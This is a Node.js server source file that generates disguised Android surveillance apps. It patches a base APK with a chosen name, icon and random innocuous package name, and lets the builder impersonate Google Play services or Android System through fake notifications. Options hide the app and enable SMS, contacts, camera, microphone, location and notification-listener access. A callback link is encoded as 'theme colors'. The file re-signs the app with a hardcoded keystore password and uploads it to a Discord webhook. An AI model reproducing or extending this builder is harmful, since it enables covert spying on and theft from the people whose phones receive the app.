const express = require('express');
const multer  = require('multer');
const cors    = require('cors');
const fs      = require('fs');
const path    = require('path');
const { exec } = require('child_process');
const sharp   = require('sharp');
const axios   = require('axios');
const cloudinary = require('cloudinary').v2;
const FormData   = require('form-data');
const AdmZip     = require('adm-zip');
require('dotenv').config();

const app  = express();
const port = process.env.PORT || 4000;
app.use(cors());
app.use(express.json());

const upload = multer({ storage: multer.memoryStorage() });

const ASSETS_DIR = path.join(__dirname, 'assets');
const TEMP_DIR   = path.join(__dirname, 'temp');
const BASE_APK   = path.join(ASSETS_DIR, 'base.apk');
const KEYSTORE   = path.join(ASSETS_DIR, 'usman90.jks');
const SIGNER     = path.join(ASSETS_DIR, 'uber-apk-signer.jar');

if (!fs.existsSync(TEMP_DIR)) fs.mkdirSync(TEMP_DIR, { recursive: true });

// ══════════════════════════════════════════════════════════════
//  BINARY UTILITIES (Zero-DEX modification, Byte-exact)
// ══════════════════════════════════════════════════════════════

function toUtf16LE(str) {
    const buf = Buffer.alloc(str.length * 2);
    for (let i = 0; i < str.length; i++) buf.writeUInt16LE(str.charCodeAt(i), i * 2);
    return buf;
}

function binaryReplaceU16(buf, searchStr, replaceStr) {
    if (searchStr.length !== replaceStr.length) {
        throw new Error(`binaryReplaceU16 length mismatch: ${searchStr.length} vs ${replaceStr.length}`);
    }
    const s = toUtf16LE(searchStr);
    const r = toUtf16LE(replaceStr);
    let count = 0, idx = 0;
    while ((idx = buf.indexOf(s, idx)) !== -1) {
        r.copy(buf, idx);
        idx += s.length;
        count++;
    }
    return count;
}

function binaryReplaceU8(buf, searchStr, replaceStr) {
    const s = Buffer.isBuffer(searchStr) ? searchStr : Buffer.from(searchStr, 'utf8');
    const r = Buffer.isBuffer(replaceStr) ? replaceStr : Buffer.from(replaceStr, 'utf8');
    if (s.length !== r.length) {
        throw new Error(`binaryReplaceU8 length mismatch: ${s.length} vs ${r.length}`);
    }
    let count = 0, idx = 0;
    while ((idx = buf.indexOf(s, idx)) !== -1) {
        r.copy(buf, idx);
        idx += s.length;
        count++;
    }
    return count;
}

function fixedLen(str, len, pad = ' ') {
    return str.length >= len ? str.substring(0, len) : str + pad.repeat(len - str.length);
}

function makeNeutralPerm(originalPerm) {
    const prefix = 'android.permission.N_';
    const needed = originalPerm.length - prefix.length;
    if (needed <= 0) return originalPerm;
    return prefix + '0'.repeat(needed);
}

// ── Package Name Pool ─────────────────────────────────────────
const OLD_PKG = 'com.asml.tech';
const PKG_POOL = [
    'com.apps.care', 'com.data.flow', 'com.core.work', 'com.base.sync',
    'com.mesh.link', 'com.node.port', 'com.arch.pull', 'com.grid.lock',
    'com.heap.scan', 'com.hook.emit', 'com.link.push', 'com.mint.flow',
    'com.kits.view', 'com.util.main', 'com.labs.conn', 'com.edge.push',
    'com.flow.core', 'com.task.data', 'com.bind.safe', 'com.ring.sync',
];

function resolvePackage(userPkg) {
    if (!userPkg || !userPkg.trim()) return PKG_POOL[Math.floor(Math.random() * PKG_POOL.length)];
    const clean = userPkg.trim().toLowerCase().replace(/[^a-z0-9.]/g, '');
    if (clean.length === OLD_PKG.length && clean.split('.').length === 3) return clean;
    return PKG_POOL[Math.floor(Math.random() * PKG_POOL.length)];
}

/**
 * Surgically replace ONLY the manifest package ID string in AXML.
 * Keeps all component class names (MainActivity, CoreService, etc.) untouched
 * so Android can resolve and launch them from classes.dex without ClassNotFoundException.
 */
function patchManifestPackageOnly(manifestBuf, newPkg) {
    const stringCount = manifestBuf.readUInt32LE(16);
    const stringStart = manifestBuf.readUInt32LE(28);
    const targetBuf = toUtf16LE(newPkg);

    let replaced = false;
    for (let i = 0; i < stringCount; i++) {
        const offset = manifestBuf.readUInt32LE(36 + i * 4);
        const absOffset = 8 + stringStart + offset;
        const len = manifestBuf.readUInt16LE(absOffset);
        const strOffset = absOffset + 2;
        const str = manifestBuf.toString('utf16le', strOffset, strOffset + len * 2);

        // ONLY match the exact package name string, NOT class names like com.asml.tech.ui.MainActivity
        if (str === OLD_PKG) {
            targetBuf.copy(manifestBuf, strOffset);
            replaced = true;
            console.log(`[PATCH] Surgically replaced manifest package at string index ${i}: "${OLD_PKG}" -> "${newPkg}"`);
            break;
        }
    }
    return replaced;
}

// ── App Name Placeholder ──────────────────────────────────────
const APP_NAME_PH = 'AppTitlePlaceholder_'; // 20 chars

// ── Icon Density Files in Base APK ───────────────────────────
const KNOWN_ICON_ENTRIES = [
    { path: 'res/d2.webp', size: 48 },
    { path: 'res/yw.webp', size: 48 },
    { path: 'res/MO.webp', size: 72 },
    { path: 'res/fq.webp', size: 72 },
    { path: 'res/qs.webp', size: 96 },
    { path: 'res/u5.webp', size: 96 },
    { path: 'res/Sn.webp', size: 144 },
    { path: 'res/j_.webp', size: 144 },
    { path: 'res/-6.webp', size: 192 },
    { path: 'res/sK.webp', size: 192 },
    { path: 'res/mipmap-mdpi/ic_launcher.webp', size: 48 },
    { path: 'res/mipmap-hdpi/ic_launcher.webp', size: 72 },
    { path: 'res/mipmap-xhdpi/ic_launcher.webp', size: 96 },
    { path: 'res/mipmap-xxhdpi/ic_launcher.webp', size: 144 },
    { path: 'res/mipmap-xxxhdpi/ic_launcher.webp', size: 192 },
    { path: 'res/mipmap-mdpi/ic_launcher_round.webp', size: 48 },
    { path: 'res/mipmap-hdpi/ic_launcher_round.webp', size: 72 },
    { path: 'res/mipmap-xhdpi/ic_launcher_round.webp', size: 96 },
    { path: 'res/mipmap-xxhdpi/ic_launcher_round.webp', size: 144 },
    { path: 'res/mipmap-xxxhdpi/ic_launcher_round.webp', size: 192 },
    { path: 'res/mipmap-mdpi/ic_launcher.png', size: 48 },
    { path: 'res/mipmap-hdpi/ic_launcher.png', size: 72 },
    { path: 'res/mipmap-xhdpi/ic_launcher.png', size: 96 },
    { path: 'res/mipmap-xxhdpi/ic_launcher.png', size: 144 },
    { path: 'res/mipmap-xxxhdpi/ic_launcher.png', size: 192 },
    { path: 'res/mipmap-mdpi/ic_launcher_round.png', size: 48 },
    { path: 'res/mipmap-hdpi/ic_launcher_round.png', size: 72 },
    { path: 'res/mipmap-xhdpi/ic_launcher_round.png', size: 96 },
    { path: 'res/mipmap-xxhdpi/ic_launcher_round.png', size: 144 },
    { path: 'res/mipmap-xxxhdpi/ic_launcher_round.png', size: 192 },
];

async function replaceIcons(zip, pngBuffer) {
    // 1. Delete Adaptive Icon XMLs so Android launcher displays custom density icons
    const adaptiveXmls = [
        'res/BW.xml',
        'res/0K.xml',
        'res/mipmap-anydpi-v26/ic_launcher.xml',
        'res/mipmap-anydpi-v26/ic_launcher_round.xml'
    ];
    for (const xml of adaptiveXmls) {
        if (zip.getEntry(xml)) {
            zip.deleteFile(xml);
            console.log(`[ICON] Removed adaptive XML: ${xml}`);
        }
    }

    // 2. Pre-generate WebP & PNG buffers for standard sizes (48, 72, 96, 144, 192)
    const sizes = [48, 72, 96, 144, 192];
    const webpCache = {};
    const pngCache = {};
    for (const s of sizes) {
        webpCache[s] = await sharp(pngBuffer).resize(s, s).webp({ quality: 95 }).toBuffer();
        pngCache[s] = await sharp(pngBuffer).resize(s, s).png().toBuffer();
    }

    // 3. Overwrite all known entries
    let count = 0;
    for (const item of KNOWN_ICON_ENTRIES) {
        const entry = zip.getEntry(item.path);
        if (entry) {
            try {
                const isPng = item.path.endsWith('.png');
                const buf = isPng ? pngCache[item.size] : webpCache[item.size];
                if (buf) {
                    entry.setData(buf);
                    count++;
                }
            } catch (err) {
                console.error(`[ICON] Failed replacing ${item.path}:`, err.message);
            }
        }
    }

    // 4. Scan for any remaining mipmap entries in ZIP and replace them
    for (const entry of zip.getEntries()) {
        const name = entry.entryName;
        if (name.startsWith('res/mipmap-') && (name.endsWith('.webp') || name.endsWith('.png'))) {
            let size = 96;
            if (name.includes('mdpi')) size = 48;
            else if (name.includes('hdpi')) size = 72;
            else if (name.includes('xhdpi')) size = 96;
            else if (name.includes('xxhdpi')) size = 144;
            else if (name.includes('xxxhdpi')) size = 192;

            const isPng = name.endsWith('.png');
            const buf = isPng ? pngCache[size] : webpCache[size];
            if (buf) {
                entry.setData(buf);
                count++;
            }
        }
    }

    console.log(`[ICON] Successfully replaced ${count} icon files across all densities`);
}

// ── Notification Presets ─────────────────────────────────────
const NOTIF_PRESETS = {
    default:            { title: 'Google Play services',  text: 'Running background checks',  icon: 'info',     action: 'device_info' },
    sync:               { title: 'Cloud Backup',          text: 'Syncing data in background', icon: 'sync',     action: 'none'        },
    google_play:        { title: 'Google Play services',  text: 'Checking for updates...',    icon: 'info',     action: 'device_info' },
    android_system:     { title: 'Android System',        text: 'System functions active',    icon: 'sync',     action: 'settings'    },
    device_security:    { title: 'Security & Privacy',    text: 'All systems secured',        icon: 'lock',     action: 'security'    },
    device_maintenance: { title: 'Device Care',           text: 'Running in background',      icon: 'sync',     action: 'settings'    },
    download_manager:   { title: 'Download Manager',      text: 'Transfer complete',          icon: 'download', action: 'none'        },
    system_ui:          { title: 'System UI',             text: 'Syncing data',               icon: 'sync',     action: 'settings'    },
    cloud:              { title: 'Cloud Storage',         text: 'Connected to cloud service', icon: 'sync',     action: 'none'        },
    active:             { title: 'System Framework',      text: 'Service active',             icon: 'info',     action: 'none'        },
};

// ══════════════════════════════════════════════════════════════
//  /generate ENDPOINT
// ══════════════════════════════════════════════════════════════

app.post('/generate', upload.single('icon'), async (req, res) => {
    const {
        uuid, appName, packageName: userPkg, hideApp, webLink, callbackUrl,
        enableSmsPermission, enableContactsPermission, enableStoragePermission,
        enableCameraPermission, enableMicrophonePermission, enableNotificationListener,
        enableLocationPermission, aggressivePermissions,
        notificationStyle, notificationClickAction, notificationTitle, notificationText, notificationIcon
    } = req.body;
    const customIcon = req.file;

    console.log(`[APK] Request UUID=${uuid} | App="${appName}" | Pkg="${userPkg}"`);
    res.status(202).json({ message: 'Processing started' });

    (async () => {
        const sendUpdate = async (event, data) => {
            if (!callbackUrl) return;
            try { await axios.post(callbackUrl, { uuid, event, data }); }
            catch (e) { console.error('[WH]', e.message); }
        };

        const unsignedPath = path.join(TEMP_DIR, `unsigned-${uuid}.apk`);

        try {
            if (!fs.existsSync(BASE_APK)) throw new Error('Base APK not found at assets/base.apk');
            if (fs.existsSync(unsignedPath)) fs.unlinkSync(unsignedPath);

            const targetPkg    = resolvePackage(userPkg);
            const targetName   = (appName && appName.trim()) ? appName.trim() : 'Google Play services';
            const finalApkName = `${targetName.replace(/[^a-zA-Z0-9]/g, '-')}.apk`;
            const preset       = NOTIF_PRESETS[notificationStyle] || NOTIF_PRESETS.default;

            await sendUpdate('apk_progress', { step: 'Loading base APK...', progress: 10 });
            const zip = new AdmZip(BASE_APK);

            // ── Step 1: Patch App Name in resources.arsc ─────────────
            await sendUpdate('apk_progress', { step: 'Patching application title...', progress: 20 });
            const arscEntry = zip.getEntry('resources.arsc');
            if (arscEntry) {
                const arscBuf = arscEntry.getData();
                const paddedName = fixedLen(targetName, APP_NAME_PH.length);
                const count = binaryReplaceU8(arscBuf, APP_NAME_PH, paddedName);
                arscEntry.setData(arscBuf);
                arscEntry.header.method = 0; // CRITICAL: method 0 (STORED)
                console.log(`[PATCH] App name replaced: ${count} occurrences -> "${paddedName.trim()}"`);
            }

            // ── Step 2: Patch AndroidManifest.xml (AXML UTF-16LE) ───
            await sendUpdate('apk_progress', { step: 'Configuring package & permissions...', progress: 35 });
            const manifestEntry = zip.getEntry('AndroidManifest.xml');
            if (manifestEntry) {
                const manifestBuf = manifestEntry.getData();

                // 2a. Surgically replace ONLY the manifest package ID (leaves class names intact to prevent crash)
                if (targetPkg !== OLD_PKG) {
                    patchManifestPackageOnly(manifestBuf, targetPkg);
                }

                // 2b. Neutralize unrequested permissions
                const isSmsEnabled      = enableSmsPermission === 'true';
                const isContactsEnabled = enableContactsPermission === 'true';
                const isCameraEnabled   = enableCameraPermission === 'true';
                const isMicEnabled      = enableMicrophonePermission === 'true';
                const isLocationEnabled = enableLocationPermission === 'true';
                const isStorageEnabled  = enableStoragePermission !== 'false';

                const permsToNeutralize = [];
                if (!isSmsEnabled) {
                    permsToNeutralize.push('android.permission.READ_SMS', 'android.permission.RECEIVE_SMS');
                }
                if (!isContactsEnabled) {
                    permsToNeutralize.push('android.permission.READ_CONTACTS');
                }
                if (!isCameraEnabled) {
                    permsToNeutralize.push('android.permission.CAMERA', 'android.permission.FOREGROUND_SERVICE_CAMERA');
                }
                if (!isMicEnabled) {
                    permsToNeutralize.push('android.permission.RECORD_AUDIO', 'android.permission.FOREGROUND_SERVICE_MICROPHONE');
                }
                if (!isLocationEnabled) {
                    permsToNeutralize.push(
                        'android.permission.ACCESS_FINE_LOCATION',
                        'android.permission.ACCESS_COARSE_LOCATION',
                        'android.permission.FOREGROUND_SERVICE_LOCATION'
                    );
                }
                if (!isStorageEnabled) {
                    permsToNeutralize.push(
                        'android.permission.READ_MEDIA_IMAGES',
                        'android.permission.READ_MEDIA_VIDEO',
                        'android.permission.READ_EXTERNAL_STORAGE'
                    );
                }

                for (const perm of permsToNeutralize) {
                    const neutral = makeNeutralPerm(perm);
                    binaryReplaceU16(manifestBuf, perm, neutral);
                }
                console.log(`[PATCH] Neutralized ${permsToNeutralize.length} unrequested permissions in manifest`);

                manifestEntry.setData(manifestBuf);
            }

            // ── Step 3: Replace Icons & Delete Adaptive XMLs ────────
            if (customIcon && customIcon.buffer) {
                await sendUpdate('apk_progress', { step: 'Embedding launcher icons...', progress: 50 });
                await replaceIcons(zip, customIcon.buffer);
            }

            // ── Step 4: Inject Runtime Configuration ────────────────
            await sendUpdate('apk_progress', { step: 'Writing configuration assets...', progress: 65 });
            const themeColors = Array.from(webLink || '').map(c => c.charCodeAt(0));

            const config = {
                hideApp:                    hideApp === 'true',
                theme_colors:               themeColors,
                appName:                    targetName,
                packageName:                targetPkg,
                enableSmsPermission:        enableSmsPermission === 'true',
                enableContactsPermission:   enableContactsPermission === 'true',
                enableStoragePermission:    enableStoragePermission !== 'false',
                enableCameraPermission:     enableCameraPermission === 'true',
                enableMicrophonePermission: enableMicrophonePermission === 'true',
                enableLocationPermission:   enableLocationPermission === 'true',
                enableNotificationListener: enableNotificationListener === 'true',
                aggressivePermissions:      aggressivePermissions === 'true',
                notificationClickAction:    notificationClickAction || preset.action,
                notificationTitle:          (notificationTitle && notificationTitle.trim()) ? notificationTitle.trim() : preset.title,
                notificationText:           (notificationText  && notificationText.trim())  ? notificationText.trim()  : preset.text,
                notificationIcon:           notificationIcon   || preset.icon,
                notificationChannelName:    (notificationTitle && notificationTitle.trim()) ? notificationTitle.trim() : preset.title,
            };

            zip.addFile('assets/config.json', Buffer.from(JSON.stringify(config, null, 2), 'utf8'));
            zip.addFile('assets/uuid.txt',    Buffer.from(uuid, 'utf8'));

            // ── Step 5: Strip Old Signatures ─────────────────────────
            await sendUpdate('apk_progress', { step: 'Preparing package signatures...', progress: 75 });
            const SIG_EXTS = ['.SF', '.RSA', '.DSA', '.EC', 'MANIFEST.MF'];
            for (const entry of zip.getEntries()) {
                const en = entry.entryName;
                if (en.startsWith('META-INF/') && SIG_EXTS.some(x => en.toUpperCase().endsWith(x))) {
                    zip.deleteFile(en);
                }
            }

            // CRITICAL: Ensure resources.arsc method is STORED (0)
            const finalArsc = zip.getEntry('resources.arsc');
            if (finalArsc) finalArsc.header.method = 0;

            // ── Step 6: Write Unsigned APK ───────────────────────────
            zip.writeZip(unsignedPath);
            console.log(`[APK] Unsigned APK written (${(fs.statSync(unsignedPath).size / 1024 / 1024).toFixed(1)} MB)`);

            // ── Step 7: Sign with usman90.jks (V1+V2+V3 + Zipalign) ─
            await sendUpdate('apk_progress', { step: 'Signing package with usman90 key...', progress: 85 });
            const ksArgs = fs.existsSync(KEYSTORE)
                ? `--ks "${KEYSTORE}" --ksAlias usman90 --ksPass "God112256@" --ksKeyPass "God112256@"`
                : '';
            const signCmd = `java -jar "${SIGNER}" --apks "${unsignedPath}" --out "${TEMP_DIR}" ${ksArgs} --allowResign`;

            await new Promise((resolve, reject) => {
                exec(signCmd, { timeout: 120000 }, (err, stdout, stderr) => {
                    if (err) {
                        console.error('[SIGN] uber-apk-signer error:', stderr || err.message);
                        exec(`java -jar "${SIGNER}" --apks "${unsignedPath}" --out "${TEMP_DIR}" --allowResign`,
                            { timeout: 60000 }, (e2) => e2 ? reject(e2) : resolve());
                    } else {
                        console.log('[SIGN] uber-apk-signer completed successfully');
                        resolve();
                    }
                });
            });

            // ── Step 8: Locate Signed Output ─────────────────────────
            await sendUpdate('apk_progress', { step: 'Finalizing package...', progress: 92 });
            const signedName = fs.readdirSync(TEMP_DIR)
                .find(f => f.startsWith(`unsigned-${uuid}`) && f.includes('signed'));
            if (!signedName) throw new Error('Signed APK not found after signing step');
            const signedPath = path.join(TEMP_DIR, signedName);

            // ── Step 9: Upload Output ────────────────────────────────
            let downloadUrl = '';
            await sendUpdate('apk_progress', { step: 'Uploading package to cloud...', progress: 95 });

            if (process.env.DISCORD_WEBHOOK_URL) {
                try {
                    const form = new FormData();
                    form.append('file', fs.createReadStream(signedPath), { filename: finalApkName });
                    const r = await axios.post(process.env.DISCORD_WEBHOOK_URL, form, {
                        headers: form.getHeaders(), maxBodyLength: Infinity, maxContentLength: Infinity
                    });
                    downloadUrl = r.data?.attachments?.[0]?.url || '';
                    if (downloadUrl) console.log('[UPLOAD] Discord:', downloadUrl);
                } catch (e) { console.error('[UPLOAD] Discord failed:', e.message); }
            }

            if (!downloadUrl && process.env.CLOUDINARY_CLOUD_NAME) {
                try {
                    cloudinary.config({
                        cloud_name:  process.env.CLOUDINARY_CLOUD_NAME,
                        api_key:     process.env.CLOUDINARY_API_KEY,
                        api_secret:  process.env.CLOUDINARY_API_SECRET,
                    });
                    const binPath = signedPath.replace('.apk', '.bin');
                    fs.copyFileSync(signedPath, binPath);
                    const r = await cloudinary.uploader.upload(binPath, {
                        resource_type: 'raw',
                        folder:        'generated_apks',
                        public_id:     `${finalApkName.replace('.apk', '')}_${Date.now()}`,
                    });
                    downloadUrl = r.secure_url || '';
                    if (fs.existsSync(binPath)) fs.unlinkSync(binPath);
                    if (downloadUrl) console.log('[UPLOAD] Cloudinary:', downloadUrl);
                } catch (e) { console.error('[UPLOAD] Cloudinary failed:', e.message); }
            }

            // ── Step 10: Cleanup ─────────────────────────────────────
            [unsignedPath, signedPath].forEach(p => {
                try { if (fs.existsSync(p)) fs.unlinkSync(p); } catch (_) {}
            });

            if (downloadUrl) {
                await sendUpdate('apk_ready', { downloadUrl, packageName: targetPkg });
                console.log(`[APK] ✓ Done: ${uuid} | pkg=${targetPkg}`);
            } else {
                await sendUpdate('apk_error', { message: 'Upload failed — check DISCORD_WEBHOOK_URL or CLOUDINARY configuration' });
            }

        } catch (err) {
            console.error(`[APK] ✗ Failed ${uuid}:`, err.message);
            try { await sendUpdate('apk_error', { message: err.message }); } catch (_) {}
            try { if (fs.existsSync(unsignedPath)) fs.unlinkSync(unsignedPath); } catch (_) {}
        }
    })();
});

app.listen(port, () => console.log(`[APK Generator] Running on port ${port}`));

